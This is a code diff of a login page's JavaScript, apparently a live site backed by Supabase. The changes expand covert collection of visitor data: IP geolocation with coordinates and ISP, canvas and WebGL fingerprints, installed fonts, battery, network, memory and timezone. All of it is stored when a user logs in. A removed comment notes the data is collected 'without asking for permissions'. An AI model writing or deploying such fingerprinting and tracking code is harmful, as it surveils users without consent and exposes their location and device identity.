@@ -196,8 +196,8 @@
 
     <script>
         // Supabase configuration
-        const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
-        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
+        const supabaseUrl = 'https://aqynejlgjwdmxsekkyld.supabase.co';
+        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuk';
         
         // Initialize Supabase
         const db = window.supabase.createClient(supabaseUrl, supabaseKey);
@@ -219,49 +219,165 @@
                 const response = await fetch(`https://ipapi.co/${ip}/json/`);
                 const data = await response.json();
                 return {
+                    ip: data.ip || ip,
                     city: data.city || null,
                     region: data.region || null,
+                    region_code: data.region_code || null,
                     country: data.country_name || null,
                     country_code: data.country_code || null,
+                    country_capital: data.country_capital || null,
+                    country_tld: data.country_tld || null,
+                    continent_code: data.continent_code || null,
                     postal: data.postal || null,
-                    timezone: data.timezone || null,
-                    org: data.org || null,
-                    isp: data.org || null,
                     latitude: data.latitude || null,
-                    longitude: data.longitude || null
+                    longitude: data.longitude || null,
+                    timezone: data.timezone || null,
+                    utc_offset: data.utc_offset || null,
+                    country_calling_code: data.country_calling_code || null,
+                    currency: data.currency || null,
+                    currency_name: data.currency_name || null,
+                    languages: data.languages || null,
+                    country_area: data.country_area || null,
+                    country_population: data.country_population || null,
+                    asn: data.asn || null,
+                    org: data.org || null,
+                    isp: data.org || null
                 };
             } catch (error) {
                 return null;
             }
         }
         
-        // Get browser fingerprint
-        function getBrowserFingerprint() {
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top";
-            ctx.font = "14px 'Arial'";
-            ctx.textBaseline = "alphabetic";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = "#069";
-            ctx.fillText("Browser Fingerprint", 2, 15);
-            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-            ctx.fillText("Browser Fingerprint", 4, 17);
+        // Better OS Detection
+        function getOS() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
             
-            const fingerprint = canvas.toDataURL();
+            // iOS detection
+            if (/iPhone|iPad|iPod/.test(ua)) {
+                if (/iPad/.test(ua)) return 'iPadOS';
+                return 'iOS';
+            }
+            if (/Mac OS X/.test(ua) && navigator.maxTouchPoints > 1) return 'iPadOS';
+            
+            // Android detection (must come before Linux)
+            if (/Android/.test(ua)) {
+                const version = ua.match(/Android\s([0-9.]+)/);
+                return version ? `Android ${version[1]}` : 'Android';
+            }
+            
+            // Windows detection
+            if (/Windows NT 10.0/.test(ua)) return 'Windows 10/11';
+            if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
+            if (/Windows NT 6.2/.test(ua)) return 'Windows 8';
+            if (/Windows NT 6.1/.test(ua)) return 'Windows 7';
+            if (/Windows/.test(ua)) return 'Windows';
+            
+            // macOS detection
+            if (/Mac OS X/.test(ua)) {
+                const version = ua.match(/Mac OS X\s([0-9_]+)/);
+                if (version) {
+                    return `macOS ${version[1].replace(/_/g, '.')}`;
+                }
+                return 'macOS';
+            }
+            
+            // Linux detection (after Android check)
+            if (/Linux/.test(ua) || /Linux/.test(platform)) {
+                if (/CrOS/.test(ua)) return 'Chrome OS';
+                if (/Ubuntu/.test(ua)) return 'Ubuntu';
+                if (/Fedora/.test(ua)) return 'Fedora';
+                if (/Debian/.test(ua)) return 'Debian';
+                return 'Linux';
+            }
+            
+            // Chrome OS
+            if (/CrOS/.test(ua)) return 'Chrome OS';
+            
+            // Other
+            if (/FreeBSD/.test(ua)) return 'FreeBSD';
+            if (/OpenBSD/.test(ua)) return 'OpenBSD';
+            
+            return 'Unknown';
+        }
+        
+        // Better Browser Detection
+        function getBrowserInfo() {
+            const ua = navigator.userAgent;
+            let name = 'Unknown';
+            let version = 'Unknown';
+            let engine = 'Unknown';
+            
+            // Edge (Chromium)
+            if (/Edg\//.test(ua)) {
+                name = 'Microsoft Edge';
+                version = ua.match(/Edg\/([0-9.]+)/)[1];
+                engine = 'Blink';
+            }
+            // Opera
+            else if (/OPR\//.test(ua)) {
+                name = 'Opera';
+                version = ua.match(/OPR\/([0-9.]+)/)[1];
+                engine = 'Blink';
+            }
+            // Chrome
+            else if (/Chrome\//.test(ua)) {
+                name = 'Google Chrome';
+                version = ua.match(/Chrome\/([0-9.]+)/)[1];
+                engine = 'Blink';
+            }
+            // Firefox
+            else if (/Firefox\//.test(ua)) {
+                name = 'Mozilla Firefox';
+                version = ua.match(/Firefox\/([0-9.]+)/)[1];
+                engine = 'Gecko';
+            }
+            // Safari
+            else if (/Safari\//.test(ua)) {
+                name = 'Apple Safari';
+                version = ua.match(/Version\/([0-9.]+)/)?.[1] || 'Unknown';
+                engine = 'WebKit';
+            }
+            // Internet Explorer
+            else if (/MSIE/.test(ua) || /Trident/.test(ua)) {
+                name = 'Internet Explorer';
+                version = ua.match(/(?:MSIE |rv:)([0-9.]+)/)[1];
+                engine = 'Trident';
+            }
+            
+            // Mobile browser detection
+            const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
             
             return {
-                canvas: fingerprint.substring(0, 500), // Store partial fingerprint
-                webgl: getWebGLInfo(),
-                fonts: detectFonts(),
-                audio: getAudioFingerprint(),
-                hardware: {
-                    cores: navigator.hardwareConcurrency,
-                    memory: navigator.deviceMemory,
-                    touchPoints: navigator.maxTouchPoints
-                }
+                name: name,
+                version: version,
+                engine: engine,
+                isMobile: isMobile,
+                fullVersion: ua.match(/(?:Chrome|Firefox|Safari|Edg|OPR)\/([0-9.]+)/)?.[1] || version
             };
+        }
+        
+        // Get device type
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            
+            if (/iPad|Tablet/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
+                return 'Tablet';
+            }
+            if (/Mobi|Android|iPhone|iPod/i.test(ua)) {
+                return 'Mobile';
+            }
+            if (/SmartTV|Smart-TV|TV/i.test(ua)) {
+                return 'Smart TV';
+            }
+            if (/Xbox|PlayStation|Nintendo/i.test(ua)) {
+                return 'Gaming Console';
+            }
+            if (/Watch/i.test(ua)) {
+                return 'Smart Watch';
+            }
+            
+            return 'Desktop';
         }
         
         // Get WebGL info
@@ -272,15 +388,21 @@
                 if (!gl) return null;
                 
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    return {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                    };
-                }
+                const vendor = debugInfo ? 
+                    gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 
+                    gl.getParameter(gl.VENDOR);
+                const renderer = debugInfo ? 
+                    gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 
+                    gl.getParameter(gl.RENDERER);
+                
                 return {
-                    vendor: gl.getParameter(gl.VENDOR),
-                    renderer: gl.getParameter(gl.RENDERER)
+                    vendor: vendor,
+                    renderer: renderer,
+                    version: gl.getParameter(gl.VERSION),
+                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+                    extensions: gl.getSupportedExtensions().slice(0, 20)
                 };
             } catch (e) {
                 return null;
@@ -290,64 +412,35 @@
         // Detect installed fonts
         function detectFonts() {
             const fontList = [
-                'Arial', 'Verdana', 'Times New Roman', 'Courier New',
-                'Georgia', 'Palatino', 'Garamond', 'Bookman',
-                'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
+                'Arial', 'Arial Black', 'Arial Narrow', 'Verdana', 'Tahoma',
+                'Times New Roman', 'Times', 'Courier New', 'Courier',
+                'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
+                'Trebuchet MS', 'Impact', 'Lucida Console', 'Lucida Sans Unicode',
+                'MS Sans Serif', 'MS Serif', 'Symbol', 'Webdings', 'Wingdings',
+                'Calibri', 'Cambria', 'Candara', 'Consolas', 'Constantia', 'Corbel',
+                'Franklin Gothic Medium', 'Segoe UI', 'Helvetica', 'Roboto',
+                'Open Sans', 'Lato', 'Montserrat', 'Poppins'
             ];
             
             const available = [];
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
+            const testString = 'mmmmmmmmmmlli';
+            const defaultFont = 'monospace';
+            
+            ctx.font = `72px ${defaultFont}`;
+            const baselineSize = ctx.measureText(testString).width;
             
             fontList.forEach(font => {
-                ctx.font = `12px "${font}"`;
-                const width = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
-                ctx.font = '12px monospace';
-                const monoWidth = ctx.measureText('abcdefghijklmnopqrstuvwxyz').width;
+                ctx.font = `72px "${font}", ${defaultFont}`;
+                const newSize = ctx.measureText(testString).width;
                 
-                if (width !== monoWidth) {
+                if (newSize !== baselineSize) {
                     available.push(font);
                 }
             });
             
             return available;
-        }
-        
-        // Get audio fingerprint
-        function getAudioFingerprint() {
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                if (!AudioContext) return null;
-                
-                const context = new AudioContext();
-                const oscillator = context.createOscillator();
-                const analyser = context.createAnalyser();
-                const gain = context.createGain();
-                const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
-                
-                gain.gain.value = 0;
-                oscillator.type = 'triangle';
-                oscillator.connect(analyser);
-                analyser.connect(scriptProcessor);
-                scriptProcessor.connect(gain);
-                gain.connect(context.destination);
-                
-                oscillator.start(0);
-                scriptProcessor.onaudioprocess = function(bins) {
-                    const audioData = bins.inputBuffer.getChannelData(0);
-                    const fingerprint = Array.from(audioData.slice(0, 100)).join(',');
-                    oscillator.disconnect();
-                    scriptProcessor.disconnect();
-                    analyser.disconnect();
-                    gain.disconnect();
-                    context.close();
-                    return fingerprint.substring(0, 500);
-                };
-                
-                return 'Audio fingerprint captured';
-            } catch (e) {
-                return null;
-            }
         }
         
         // Get battery info
@@ -375,10 +468,37 @@
                     effectiveType: navigator.connection.effectiveType,
                     downlink: navigator.connection.downlink,
                     rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData
+                    saveData: navigator.connection.saveData,
+                    type: navigator.connection.type
                 };
             }
             return null;
+        }
+        
+        // Get memory info
+        function getMemoryInfo() {
+            if (performance.memory) {
+                return {
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: performance.memory.usedJSHeapSize
+                };
+            }
+            return null;
+        }
+        
+        // Get timezone info
+        function getTimezoneInfo() {
+            const date = new Date();
+            return {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                offset: date.getTimezoneOffset(),
+                offsetHours: -(date.getTimezoneOffset() / 60),
+                dateString: date.toString(),
+                localeString: date.toLocaleString(),
+                localeDate: date.toLocaleDateString(),
+                localeTime: date.toLocaleTimeString()
+            };
         }
         
         // Make handleLogin globally accessible
@@ -421,12 +541,18 @@
             try {
                 console.log('Collecting device information...');
                 
-                // Collect all data without asking for permissions
+                // Collect all data
                 const ip = await getIPAddress();
                 const ipDetails = await getIPDetails(ip);
-                const fingerprint = getBrowserFingerprint();
+                const browserInfo = getBrowserInfo();
+                const os = getOS();
+                const deviceType = getDeviceType();
+                const webglInfo = getWebGLInfo();
+                const fonts = detectFonts();
                 const batteryInfo = await getBatteryInfo();
                 const networkInfo = getNetworkInfo();
+                const memoryInfo = getMemoryInfo();
+                const timezoneInfo = getTimezoneInfo();
                 
                 console.log('Saving data to Supabase...');
                 
@@ -440,14 +566,21 @@
                             user_agent: navigator.userAgent,
                             referer: document.referrer || 'Direct',
                             device_info: {
+                                browser: browserInfo,
+                                os: os,
+                                deviceType: deviceType,
+                                screen: {
+                                    width: window.screen.width,
+                                    height: window.screen.height,
+                                    availWidth: window.screen.availWidth,
+                                    availHeight: window.screen.availHeight,
+                                    colorDepth: window.screen.colorDepth,
+                                    pixelDepth: window.screen.pixelDepth,
+                                    pixelRatio: window.devicePixelRatio,
+                                    orientation: window.screen.orientation?.type || 'Unknown'
+                                },
                                 language: navigator.language,
                                 languages: navigator.languages,
-                                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                                availableScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
-                                colorDepth: window.screen.colorDepth,
-                                pixelDepth: window.screen.pixelDepth,
-                                pixelRatio: window.devicePixelRatio,
-                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                 platform: navigator.platform,
                                 vendor: navigator.vendor,
                                 cookiesEnabled: navigator.cookieEnabled,
@@ -455,15 +588,21 @@
                                 hardwareConcurrency: navigator.hardwareConcurrency,
                                 deviceMemory: navigator.deviceMemory || 'unknown',
                                 maxTouchPoints: navigator.maxTouchPoints,
-                                remember: remember,
-                                browser: {
-                                    name: getBrowserName(),
-                                    version: getBrowserVersion(),
-                                    engine: getBrowserEngine(),
-                                    os: getOS()
+                                webgl: webglInfo,
+                                fonts: fonts,
+                                memory: memoryInfo,
+                                timezone: timezoneInfo,
+                                remember: remember
+                            },
+                            fingerprint_data: {
+                                canvas: getCanvasFingerprint(),
+                                webgl: webglInfo,
+                                fonts: fonts.length,
+                                hardware: {
+                                    cores: navigator.hardwareConcurrency,
+                                    memory: navigator.deviceMemory
                                 }
                             },
-                            fingerprint_data: fingerprint,
                             ip_details: ipDetails,
                             battery_info: batteryInfo,
                             network_info: networkInfo,
@@ -492,40 +631,39 @@
             }
         };
         
-        // Helper functions for browser detection
-        function getBrowserName() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Firefox')) return 'Firefox';
-            if (ua.includes('Edg')) return 'Edge';
-            if (ua.includes('Chrome')) return 'Chrome';
-            if (ua.includes('Safari')) return 'Safari';
-            if (ua.includes('Opera')) return 'Opera';
-            if (ua.includes('MSIE') || ua.includes('Trident')) return 'Internet Explorer';
-            return 'Unknown';
-        }
-        
-        function getBrowserVersion() {
-            const ua = navigator.userAgent;
-            const match = ua.match(/(firefox|chrome|safari|edge|opera|msie)[\/\s](\d+)/i);
-            return match ? match[2] : 'Unknown';
-        }
-        
-        function getBrowserEngine() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Gecko')) return 'Gecko';
-            if (ua.includes('WebKit')) return 'WebKit';
-            if (ua.includes('Trident')) return 'Trident';
-            return 'Unknown';
-        }
-        
-        function getOS() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Windows')) return 'Windows';
-            if (ua.includes('Mac')) return 'MacOS';
-            if (ua.includes('Linux')) return 'Linux';
-            if (ua.includes('Android')) return 'Android';
-            if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
-            return 'Unknown';
+        // Canvas fingerprint
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                canvas.width = 200;
+                canvas.height = 50;
+                
+                // Draw various elements
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125,1,62,20);
+                
+                ctx.fillStyle = "#069";
+                ctx.fillText("Fingerprint Test", 2, 15);
+                
+                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+                ctx.font = "18px 'Arial'";
+                ctx.fillText("Canvas Test", 4, 30);
+                
+                // Add gradient
+                const gradient = ctx.createLinearGradient(0, 0, 200, 50);
+                gradient.addColorStop(0, 'blue');
+                gradient.addColorStop(1, 'red');
+                ctx.fillStyle = gradient;
+                ctx.fillRect(150, 30, 50, 20);
+                
+                return canvas.toDataURL();
+            } catch (e) {
+                return null;
+            }
         }
         
         window.forgotPassword = function(event) {
